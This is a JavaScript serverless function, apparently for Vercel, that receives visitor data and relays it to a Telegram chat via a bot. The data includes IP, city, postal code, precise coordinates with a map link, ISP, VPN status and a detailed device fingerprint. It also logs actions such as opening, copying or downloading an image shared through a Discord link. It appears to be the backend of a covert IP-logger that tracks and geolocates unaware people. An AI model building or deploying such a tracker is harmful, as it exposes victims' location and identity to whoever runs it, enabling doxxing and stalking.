function esc(value) {
    if (value === undefined || value === null || value === '') return '—';
    return String(value)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

function line(label, value) {
    if (value === undefined || value === null || value === '') return '';
    return `<b>${label}:</b> ${esc(value)}\n`;
}

const ACTION_LABELS = {
    visit: '🆕 <b>Nouvelle visite</b>',
    image_open: '🖼️ <b>Image ouverte (lien Discord / navigateur)</b>',
    image_download: '📥 <b>Image téléchargée</b>',
    copy: '📋 <b>Image copiée</b>',
    save: '💾 <b>Tentative enregistrement</b>',
    drag: '⬇️ <b>Image glissée / téléchargée</b>',
    print: '🖨️ <b>Tentative impression</b>',
    shortcut: '⌨️ <b>Raccourci copie/enregistrement</b>'
};

function formatMessage({ location, device, page, time, action }) {
    const title = ACTION_LABELS[action] || ACTION_LABELS.visit;
    let msg = title + '\n';
    if (action && action !== 'visit') {
        msg += `<b>Action:</b> ${esc(action)}\n`;
    }
    msg += '\n';

    msg += '📍 <b>Localisation</b>\n';
    if (location) {
        msg += line('IP', location.ip);
        msg += line('Pays', location.country);
        msg += line('Code pays', location.countryCode);
        msg += line('Région', location.region);
        msg += line('Ville', location.city);
        msg += line('Code postal', location.postal);
        msg += line('Latitude', location.latitude);
        msg += line('Longitude', location.longitude);
        msg += line('Fuseau', location.timezone);
        msg += line('FAI', location.isp);
        msg += line('Organisation', location.org);
        msg += line('ASN', location.asn);
        if (location.mobile !== undefined) msg += line('Mobile', location.mobile ? 'Oui' : 'Non');
        if (location.proxy !== undefined) msg += line('Proxy/VPN', location.proxy ? 'Oui' : 'Non');
        msg += line('API', location.api);
        if (location.latitude && location.longitude) {
            const maps = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
            msg += `<b>Carte:</b> <a href="${esc(maps)}">Google Maps</a>\n`;
        }
    } else {
        msg += '<i>Non disponible</i>\n';
    }

    msg += '\n📱 <b>Appareil</b>\n';
    if (device) {
        msg += line('Type', device.deviceType);
        msg += line('OS', device.os);
        msg += line('Version OS', device.osVersion);
        msg += line('Navigateur', device.browser);
        msg += line('Version', device.browserVersion);
        msg += line('Plateforme', device.platform);
        msg += line('Langue', device.language);
        msg += line('Langues', device.languages);
        msg += line('Écran', device.screen);
        msg += line('Ratio pixels', device.pixelRatio);
        msg += line('Fuseau local', device.timezone);
        msg += line('CPU', device.cores);
        msg += line('Mémoire (Go)', device.memory);
        msg += line('Tactile', device.touch);
        msg += line('Réseau', device.connection);
        msg += line('Batterie', device.battery);
        const ua = device.userAgent;
        if (ua && ua.length > 200) {
            msg += line('User-Agent', ua.slice(0, 200) + '…');
        } else {
            msg += line('User-Agent', ua);
        }
    } else {
        msg += '<i>Non disponible</i>\n';
    }

    msg += '\n🌐 <b>Page</b>\n';
    msg += line('URL', page);
    msg += line('Heure', time);

    return msg;
}

async function readJsonBody(req) {
    if (req.body) {
        if (typeof req.body === 'object') return req.body;
        if (typeof req.body === 'string' && req.body.trim()) {
            return JSON.parse(req.body);
        }
    }

    return new Promise((resolve, reject) => {
        let data = '';
        req.on('data', (chunk) => { data += chunk; });
        req.on('end', () => {
            try {
                resolve(data ? JSON.parse(data) : {});
            } catch (e) {
                reject(new Error('JSON invalide'));
            }
        });
        req.on('error', reject);
    });
}

async function sendTelegram(token, chatId, text, parseMode) {
    const payload = {
        chat_id: chatId,
        text,
        disable_web_page_preview: true
    };
    if (parseMode) payload.parse_mode = parseMode;

    const tgRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });

    return tgRes.json();
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }

    const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
    const chatId = process.env.TELEGRAM_CHAT_ID?.trim();

    if (req.method === 'GET') {
        return res.status(200).json({
            ok: true,
            configured: Boolean(token && chatId),
            hint: !token || !chatId
                ? 'Ajoute TELEGRAM_BOT_TOKEN et TELEGRAM_CHAT_ID sur Vercel puis redéploie'
                : 'API prête — envoie un POST depuis la page'
        });
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ ok: false, error: 'Method not allowed' });
    }

    if (!token || !chatId) {
        return res.status(500).json({
            ok: false,
            error: 'Variables TELEGRAM_BOT_TOKEN et TELEGRAM_CHAT_ID manquantes sur Vercel'
        });
    }

    try {
        const body = await readJsonBody(req);
        const text = formatMessage({
            location: body.location || null,
            device: body.device || null,
            page: body.page || req.headers.referer || '—',
            time: body.time || new Date().toISOString(),
            action: body.action || 'visit'
        });

        let tgData = await sendTelegram(token, chatId, text, 'HTML');

        if (!tgData.ok && /parse entities|can't parse/i.test(tgData.description || '')) {
            tgData = await sendTelegram(token, chatId, text.replace(/<[^>]+>/g, ''), null);
        }

        if (!tgData.ok) {
            return res.status(502).json({
                ok: false,
                error: tgData.description || 'Erreur Telegram',
                hint: 'Vérifie que le bot est admin du canal et que TELEGRAM_CHAT_ID est correct'
            });
        }

        return res.status(200).json({ ok: true });
    } catch (err) {
        return res.status(500).json({ ok: false, error: err.message });
    }
};
